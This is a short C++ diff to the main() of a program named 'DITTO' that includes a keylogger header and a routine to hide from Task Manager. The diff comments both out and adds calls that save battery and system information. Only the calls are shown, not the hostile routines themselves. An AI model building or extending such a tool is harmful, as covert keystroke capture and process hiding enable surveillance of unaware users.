@@ -4,6 +4,8 @@
 #include "Logger.hpp"
 #include "SystemUtils.hpp"
 #include "KeyLogger.hpp"
+#include "BatteryUtils.hpp"
+#include "SystemInfo.hpp"
 #include <exception>
 #include <iostream>
 #include <chrono>
@@ -14,12 +16,15 @@ int main()
 	{
 		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");
 
+		BatteryUtils::save_battery_info();
+		SystemInfo::save_system_info();
+
 		//Thread key_logger_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&KeyLogger::start), nullptr };
-		Thread tskmgr_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&SystemUtils::hide_from_task_manager), nullptr };
+		//KeyLogger key_logger;
+		//Thread tskmgr_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&SystemUtils::hide_from_task_manager), nullptr };
 		
-		//key_logger_thread.run();
-		tskmgr_thread.run();
-		tskmgr_thread.wait();
+		//tskmgr_thread.run();
+		//tskmgr_thread.wait();
 
 	}
 	catch (WindowsException exp)
@@ -32,6 +37,7 @@ int main()
 	}
 	catch (...)
 	{
+		std::wcout << "hey" << std::endl;
 		OutputDebugString(L"Unexpected exception");
 	}
 }
